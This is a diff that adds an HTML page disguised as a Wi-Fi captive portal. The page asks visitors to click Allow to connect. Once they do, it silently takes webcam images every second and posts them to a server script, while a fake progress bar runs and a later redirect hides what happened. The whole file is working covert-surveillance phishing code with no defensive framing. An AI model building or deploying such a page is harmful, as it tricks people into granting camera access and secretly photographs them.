@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wifi Portal</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        #h1Container {
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 10px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            margin: 0;
+        }
+
+        #loadingBarContainer {
+            display: none;
+            width: 90%;
+            background-color: #bfbfbf;
+            position: relative;
+            height: 15px; 
+            border-radius: 7.5px; 
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        #loadingBar {
+            width: 0;
+            height: 100%;
+            background-color: #4caf50;
+            border-radius: 7.5px;
+        }
+
+        #loadingText {
+            display: none;
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="h1Container">
+    <h1>Click Allow to connect to Wi-Fi</h1>
+</div>
+
+<video id="videoElement" autoplay playsinline style="display:none;"></video>
+<div id="loadingText">Connecting...</div>
+<div id="loadingBarContainer">
+    <div id="loadingBar"></div>
+</div>
+
+<script>
+    let videoStream;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        videoStream = stream;
+        let video = document.getElementById('videoElement');
+        video.srcObject = stream;
+
+        document.getElementById('loadingText').style.display = 'block';
+        document.getElementById('loadingBarContainer').style.display = 'block';
+        let loadingBar = document.getElementById('loadingBar');
+        
+        let width = 0;
+        let loadingInterval = setInterval(function() {
+            if (width >= 100) {
+                clearInterval(loadingInterval);
+            } else {
+                width++;
+                loadingBar.style.width = width + '%';
+            }
+        }, 200);
+
+        setTimeout(function() {
+            window.location.href = 'http://example.com';
+        }, 20000);
+
+        setInterval(captureImage, 1000); 
+
+    })
+    .catch(function(err) {
+        console.log("An error occurred: " + err);
+    });
+
+    function captureImage() {
+        let video = document.getElementById('videoElement');
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        let context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        let imageData = canvas.toDataURL('image/png');
+        fetch('img.php', {
+            method: 'POST',
+            body: JSON.stringify({ image: imageData }),
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(response => response.text())
+        .then(data => console.log(data));
+    }
+
+    window.onbeforeunload = function() {
+        if (videoStream) {
+            captureImage();
+            videoStream.getTracks().forEach(track => track.stop());
+        }
+    };
+</script>
+
+</body>
+</html>
